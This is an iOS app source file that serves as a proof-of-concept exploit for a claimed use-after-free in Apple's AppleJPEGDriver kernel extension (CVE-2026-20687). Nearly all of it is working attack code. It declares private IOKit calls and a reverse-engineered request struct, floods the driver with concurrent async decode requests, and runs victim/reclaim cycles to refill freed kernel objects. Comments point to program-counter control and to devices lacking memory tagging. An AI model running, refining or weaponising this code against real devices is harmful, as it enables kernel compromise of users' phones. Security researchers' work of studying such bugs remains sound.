//
//  ViewController.m — JPEGUAF
//  CVE-2026-20687: AppleJPEGDriver startDecoder UAF
//
//  Tested on A19 Pro / iOS 26.3 (PoC)
//  Target: A15 / iOS 26.2 (NO MTE → silent UAF, more exploitable)
//
//  JpegRequest: 0x440 (1088 bytes), pool-allocated
//  PC control: *(*(req+0)+40)() in finish_io_gated
//

#import "ViewController.h"
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>

// ── IOKit declarations (not in public iOS headers) ──
extern const mach_port_t kIOMainPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char *name);
kern_return_t IOServiceGetMatchingServices(mach_port_t, CFDictionaryRef, io_iterator_t *);
io_object_t   IOIteratorNext(io_iterator_t);
kern_return_t IOServiceOpen(io_service_t, task_port_t, uint32_t, io_connect_t *);
kern_return_t IOServiceClose(io_connect_t);
kern_return_t IOObjectRelease(io_object_t);
kern_return_t IOConnectCallStructMethod(io_connect_t, uint32_t,
    const void *, size_t, void *, size_t *);
kern_return_t IOConnectCallMethod(io_connect_t, uint32_t,
    const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);

// ── AppleJPEGDriverIOStruct (0x58 bytes, reverse-engineered) ──
typedef struct __attribute__((packed)) {
    uint32_t sourceID;       // +0x00: source IOSurface ID (JPEG data)
    uint32_t field_04;       // +0x04: JPEG input file size
    uint32_t destID;         // +0x08: dest IOSurface ID (pixel output)
    uint32_t field_0C;       // +0x0C: output buffer size
    uint32_t field_10;       // +0x10
    uint32_t width;          // +0x14: pixel width
    uint32_t height;         // +0x18: pixel height
    uint32_t field_1C;       // +0x1C
    uint8_t  flags;          // +0x20: bit0=progressive
    uint8_t  pad_21[3];
    uint32_t xOffset;        // +0x24
    uint32_t yOffset;        // +0x28
    uint32_t subsampling;    // +0x2C: 0=444, 1=422, 3=420, 4=411
    uint64_t asyncToken;     // +0x30: non-zero = async mode
    uint64_t asyncToken2;    // +0x38
    uint64_t field_40;       // +0x40
    uint32_t codecID;        // +0x48
    uint32_t outWidth;       // +0x4C
    uint32_t outHeight;      // +0x50
    uint32_t field_54;       // +0x54
} JpegIOStruct;
@interface ViewController ()
@property (nonatomic, strong) UIButton *sprayButton;
@property (nonatomic, strong) UIButton *reclaimButton;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) BOOL running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;

    self.sprayButton = [self makeBtn:@"Spray & Leak (→ Camera)" color:[UIColor systemRedColor] action:@selector(sprayTapped)];
    self.reclaimButton = [self makeBtn:@"UAF Reclaim Test" color:[UIColor systemOrangeColor] action:@selector(reclaimTapped)];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"CVE-2026-20687 | A15 iOS 26.2";
    self.statusLabel.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightRegular];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.numberOfLines = 0;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;

    self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0];
    self.logView.text = @"JPEGUAF v1 — CVE-2026-20687\n";

    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.sprayButton.topAnchor constraintEqualToAnchor:safe.topAnchor constant:30],
        [self.sprayButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.sprayButton.widthAnchor constraintGreaterThanOrEqualToConstant:260],
        [self.reclaimButton.topAnchor constraintEqualToAnchor:self.sprayButton.bottomAnchor constant:12],
        [self.reclaimButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.reclaimButton.widthAnchor constraintGreaterThanOrEqualToConstant:260],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.reclaimButton.bottomAnchor constant:20],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:8],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-8],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-8],
    ]];
}

- (UIButton *)makeBtn:(NSString *)title color:(UIColor *)color action:(SEL)action {
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    btn.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *cfg = [UIButtonConfiguration filledButtonConfiguration];
    cfg.baseBackgroundColor = color;
    btn.configuration = cfg;
    [btn setTitle:title forState:UIControlStateNormal];
    [btn addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn];
    return btn;
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

#pragma mark - Logging

- (void)log:(NSString *)fmt, ... NS_FORMAT_FUNCTION(1,2) {
    va_list args;
    va_start(args, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    NSLog(@"[JPEGUAF] %@", msg);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", msg];
        NSRange bottom = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:bottom];
    });
}

- (void)setStatus:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{ self.statusLabel.text = text; });
}

#pragma mark - Memory

- (int64_t)wiredPages {
    vm_statistics64_data_t s;
    mach_msg_type_number_t c = HOST_VM_INFO64_COUNT;
    if (host_statistics64(mach_host_self(), HOST_VM_INFO64, (host_info64_t)&s, &c) != KERN_SUCCESS)
        return -1;
    return (int64_t)s.wire_count;
}

#pragma mark - IOKit

- (io_service_t)findService {
    CFMutableDictionaryRef m = IOServiceMatching("AppleJPEGDriver");
    if (!m) return 0;
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
        return 0;
    io_service_t svc = IOIteratorNext(it);
    IOObjectRelease(it);
    return svc;
}

- (io_connect_t)openConn:(io_service_t)svc {
    io_connect_t c = 0;
    IOServiceOpen(svc, mach_task_self(), 0, &c);
    return c;
}

- (BOOL)driverOk:(io_service_t)svc {
    io_connect_t c = [self openConn:svc];
    if (!c) return NO;
    kern_return_t kr = IOConnectCallMethod(c, 2, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
    IOServiceClose(c);
    return kr == KERN_SUCCESS;
}

#pragma mark - IOSurface

- (IOSurfaceRef)makeSourceSurf:(NSData *)jpeg {
    size_t sz = (jpeg.length + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *p = @{
        (id)kIOSurfaceWidth: @(sz), (id)kIOSurfaceHeight: @1,
        (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020,
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)p);
    if (!s) return NULL;
    IOSurfaceLock(s, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(s), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(s, 0, NULL);
    return s;
}

- (IOSurfaceRef)makeDestSurf:(uint32_t)w h:(uint32_t)h {
    NSDictionary *p = @{
        (id)kIOSurfaceWidth: @(w), (id)kIOSurfaceHeight: @(h),
        (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241,
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)p);
}

- (NSData *)testJPEG:(int)w h:(int)h {
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

#pragma mark - Async submit

- (int)submitAsync:(io_connect_t)c src:(uint32_t)src dst:(uint32_t)dst
               w:(uint32_t)w h:(uint32_t)h n:(int)n base:(uint64_t)base {
    int ok = 0;
    for (int i = 0; i < n; i++) {
        JpegIOStruct in = {0}, out = {0};
        in.sourceID = src;  in.field_04 = w * h;
        in.destID = dst;    in.field_0C = w * h * 4;
        in.width = w;       in.height = h;
        in.outWidth = w;    in.outHeight = h;
        in.subsampling = 3; in.asyncToken = base + i;
        size_t os = sizeof(out);
        if (IOConnectCallStructMethod(c, 1, &in, sizeof(in), &out, &os) != KERN_SUCCESS)
            break;
        ok++;
    }
    return ok;
}

#pragma mark - Spray (Path 1: massive concurrent spray → Camera trigger)

- (void)sprayTapped {
    if (self.running) return;
    self.running = YES;
    [self setStatus:@"Spraying..."];

    const int THREADS = 8, REQS = 10, PER = 125;

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self log:@"=== Spray: %d threads x %d iters x %d reqs ===", THREADS, PER, REQS];

        io_service_t svc = [self findService];
        if (!svc) { [self log:@"Service not found"]; self.running = NO; return; }
        if (![self driverOk:svc]) { [self log:@"Driver broken"]; IOObjectRelease(svc); self.running = NO; return; }

        const uint32_t W = 2048, H = 2048;
        NSData *jpeg = [self testJPEG:W h:H];
        IOSurfaceRef srcSurf = [self makeSourceSurf:jpeg];
        IOSurfaceRef dstSurf = [self makeDestSurf:W h:H];
        if (!srcSurf || !dstSurf) {
            [self log:@"Surface failed"];
            if (srcSurf) CFRelease(srcSurf); if (dstSurf) CFRelease(dstSurf);
            IOObjectRelease(svc); self.running = NO; return;
        }
        uint32_t srcID = IOSurfaceGetID(srcSurf), dstID = IOSurfaceGetID(dstSurf);
        [self log:@"src=%u dst=%u", srcID, dstID];

        vm_size_t ps = 0; host_page_size(mach_host_self(), &ps);
        int64_t w0 = [self wiredPages];
        __block int32_t totalOK = 0, totalConn = 0;
        dispatch_group_t g = dispatch_group_create();

        for (int t = 0; t < THREADS; t++) {
            dispatch_group_async(g, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                for (int i = 0; i < PER && self.running; i++) {
                    io_connect_t conn = [self openConn:svc];
                    if (!conn) continue;
                    int n = [self submitAsync:conn src:srcID dst:dstID w:W h:H n:REQS base:0x4141];
                    IOServiceClose(conn);
                    __sync_fetch_and_add(&totalOK, n);
                    __sync_fetch_and_add(&totalConn, 1);
                }
            });
        }

        while (dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC)) != 0) {
            if (!self.running) break;
            int64_t d = [self wiredPages] - w0;
            [self log:@"[conn=%d req=%d] wired %+lld KB", totalConn, totalOK, d*(int64_t)ps/1024];
        }

        usleep(500000);
        int64_t w1 = [self wiredPages];
        BOOL ok = [self driverOk:svc];
        IOObjectRelease(svc); CFRelease(srcSurf); CFRelease(dstSurf);

        [self log:@"=== Done: %d conn, %d req, wired %+lld KB, driver %@ ===",
            totalConn, totalOK, (w1-w0)*(int64_t)ps/1024, ok ? @"OK" : @"BROKEN"];
        [self log:@"A15 no MTE → UAF may be silent (no panic). Open Camera to trigger stale queue walk."];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.statusLabel.text = @"OPEN CAMERA NOW";
            self.statusLabel.font = [UIFont systemFontOfSize:28 weight:UIFontWeightBlack];
            self.statusLabel.textColor = [UIColor redColor];
            [UIView animateWithDuration:0.5 delay:0
                options:UIViewAnimationOptionRepeat|UIViewAnimationOptionAutoreverse
                animations:^{ self.statusLabel.alpha = 0.2; } completion:nil];
        });
        self.running = NO;
    });
}

#pragma mark - Reclaim test (Path 2: controlled victim→reclaim cycles)

- (void)reclaimTapped {
    if (self.running) return;
    self.running = YES;
    [self setStatus:@"Reclaim test..."];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self log:@"=== UAF Reclaim Test ==="];
        [self log:@"Object: JpegRequest 0x440 | A15: no MTE → silent UAF"];

        io_service_t svc = [self findService];
        if (!svc) { [self log:@"Service not found"]; self.running = NO; return; }
        if (![self driverOk:svc]) { [self log:@"Driver broken"]; IOObjectRelease(svc); self.running = NO; return; }

        const uint32_t W = 2048, H = 2048;
        NSData *jpeg = [self testJPEG:W h:H];
        IOSurfaceRef vSrc = [self makeSourceSurf:jpeg], vDst = [self makeDestSurf:W h:H];
        IOSurfaceRef rSrc = [self makeSourceSurf:jpeg], rDst = [self makeDestSurf:W h:H];
        if (!vSrc||!vDst||!rSrc||!rDst) {
            [self log:@"Surface failed"]; IOObjectRelease(svc);
            if(vSrc)CFRelease(vSrc); if(vDst)CFRelease(vDst);
            if(rSrc)CFRelease(rSrc); if(rDst)CFRelease(rDst);
            self.running = NO; return;
        }
        uint32_t vs = IOSurfaceGetID(vSrc), vd = IOSurfaceGetID(vDst);
        uint32_t rs = IOSurfaceGetID(rSrc), rd = IOSurfaceGetID(rDst);
        [self log:@"victim: %u/%u  reclaim: %u/%u", vs, vd, rs, rd];

        const int CYCLES = 50, V_REQS = 5, R_CONNS = 3, R_REQS = 5;
        int vTot = 0, rTot = 0, panicFree = 0;

        for (int c = 0; c < CYCLES && self.running; c++) {
            // Victim: submit → close (creates stale queue entries)
            io_connect_t vc = [self openConn:svc];
            if (vc) {
                vTot += [self submitAsync:vc src:vs dst:vd w:W h:H n:V_REQS base:0xDEAD];
                IOServiceClose(vc);
            }
            usleep(1000);

            // Reclaim: open new conns → submit → fill freed JpegRequest slots
            for (int r = 0; r < R_CONNS; r++) {
                io_connect_t rc = [self openConn:svc];
                if (!rc) continue;
                rTot += [self submitAsync:rc src:rs dst:rd w:W h:H n:R_REQS base:0xBEEF+c*0x10+r];
                IOServiceClose(rc);
            }

            if ((c+1) % 10 == 0) {
                usleep(100000);
                if ([self driverOk:svc]) panicFree++;
                [self log:@"  [%d] v=%d r=%d", c+1, vTot, rTot];
            }
        }

        BOOL ok = [self driverOk:svc];
        IOObjectRelease(svc); CFRelease(vSrc); CFRelease(vDst); CFRelease(rSrc); CFRelease(rDst);

        [self log:@"=== Done: %d cycles, %d victim / %d reclaim ===", CYCLES, vTot, rTot];
        [self log:@"Driver: %@ | No-panic cycles: %d/%d", ok?@"OK":@"BROKEN", panicFree, CYCLES/10];
        if (panicFree == CYCLES/10)
            [self log:@"*** NO PANIC after %d cycles → reclaim RACE WINDOW confirmed on A15 ***", CYCLES];
        [self log:@"Next: open Camera to trigger deferred fullSpeedRequestExist walk"];
        self.running = NO;
    });
}

@end
